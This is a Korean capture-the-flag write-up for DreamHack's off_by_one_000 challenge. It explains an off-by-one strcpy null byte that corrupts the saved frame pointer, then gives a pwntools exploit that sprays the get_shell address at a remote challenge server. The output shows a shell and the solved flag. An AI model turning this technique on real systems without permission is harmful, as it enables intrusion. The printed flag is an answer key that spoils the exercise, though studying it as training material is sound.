# [DreamHack] off_by_one_000

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 서버에서 작동하고 있는 서비스(off_by_one_000)의 바이너리와 소스 코드가 주어집니다.
> 프로그램의 취약점을 찾고 익스플로잇해 get_shell 함수를 실행시키세요.
> 셸을 획득한 후, “flag” 파일을 읽어 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [off_by_one_000.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8540249/off_by_one_000.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/162665874-eb03e1ac-bf4e-4116-8a0c-270f0a6346a9.png)

## Analysis

```c
char cp_name[256];

int cpy()
{
    char real_name[256];
    strcpy(real_name, cp_name); // off-by-one
    return 0;
}

int main()
{
    initialize();
    printf("Name: ");
    read(0, cp_name, sizeof(cp_name));

    cpy();

    printf("Name: %s", cp_name);

    return 0;
}
```

`cpy()`의 스택은 `real_name` `0x100`바이트, SFP, return address로 구성되어 있다. `cp_name`에 `0x100`바이트를 가득 채우면 `strcpy()`로 복사할 때 끝에 `'\x00'`이 붙어서 SFB의 하위 1바이트를 `'\x00'`으로 덮게 된다.

![image](https://user-images.githubusercontent.com/102066383/162666301-9b35d398-8938-4b97-bf8d-a6198133d3f4.png)

그러면 `cpy()`가 리턴한 후 `main()`의 `ebp`가 `cpy()`의 스택 프레임 안쪽에 있게 되고, `main()`의 return address도 마찬가지이다.

![image](https://user-images.githubusercontent.com/102066383/162666414-d3934edf-bf57-46a1-b780-f9dfd6c6eb91.png)

이 위치에 `get_shell()`의 주소를 넣어두면 `main()`은 `get_shell()`로 리턴하게 되고, 셸을 획득할 수 있다. 그런데 스택 주소는 고정되어 있지 않으므로 스택의 모든 칸에 `get_shell()`의 주소를 넣어두면 무조건 익스플로잇을 성공시킬 수 있다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/off_by_one_000')
else:
    r = remote('host1.dreamhack.games', 15259)

get_shell = 0x80485db # get_shell()

payload = p32(get_shell) * 0x40

r.sendafter('Name: ', payload)

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 15259: Done
/home/n1be/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:812: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Switching to interactive mode
Name: ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04ۅ\x04$ cat flag
DH{fef043d0dbe030d01756c23b78a660ae}
```